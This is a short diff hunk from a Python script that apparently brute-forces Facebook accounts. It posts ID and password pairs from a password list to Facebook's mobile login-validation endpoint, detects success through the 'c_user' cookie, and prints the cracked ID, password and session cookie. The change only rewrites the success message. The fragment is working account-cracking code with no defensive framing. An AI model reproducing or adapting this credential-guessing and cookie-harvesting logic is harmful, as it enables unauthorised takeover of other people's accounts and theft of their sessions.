@@ -1302,7 +1302,7 @@ def ffb(ids,names,passlist):
                         complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         ASX=str(session.cookies)
                         if "c_user" in ASX:
-                                print(f'\r\x1b[1;90m[RAWA-OK]\x1b[1;91m   {idf} | \x1b[0;96m{pw} | \x1b[0;34m{kuki}')
+                                print('\x1b[0;90m[RaWa-Ok🌪️] '+ids+' | '+pas+'\33[0;97m')
                                 print("\033[1;92m[•] Cookie: "+coki)
                                 os.system('espeak -a 300 " RaWa,  OK,    ,ID   PASSWORD"')
                                 dc=dict(session.cookies)
